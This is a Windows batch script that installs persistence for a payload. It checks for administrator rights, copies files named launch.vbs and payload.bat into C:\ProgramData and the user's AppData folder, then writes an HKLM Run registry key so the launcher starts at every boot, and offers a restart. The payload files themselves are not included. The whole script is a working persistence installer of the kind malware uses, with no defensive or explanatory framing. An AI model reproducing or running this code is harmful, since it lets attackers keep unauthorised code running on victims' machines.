@echo off&cd /D "%~dp0"
    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto AT
    ) else (
        goto no_admin
    )
    :AT
echo %CD%
copy payload\launch.vbs C:\ProgramData >Nul
if exist "C:\ProgramData\launch.vbs" (echo [92msuccessfuly moved launch.vbs[0m) else (echo [31mfailed to move launch.vbs[0m)
copy "payload\payload.bat"  "C:\users\%username%\AppData" >nul
if exist "C:\users\%username%\AppData\payload.bat" (echo [92msuccessfuly moved payload.bat[0m) else (echo [31mfailed to move payload.bat[0m)
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v payload /t REG_SZ /d "WScript C:\ProgramData\launch.vbs"
echo [92msuccessfuly modified HKLM registry[0m
echo would you like to restart for the changes to take effect?
choice 
if %errorlevel% equ 1 shutdown /g
exit
:no_admin
echo [31merror, program needs administrator rights[0m
echo.
echo press any key to exit...
pause >nul
exit
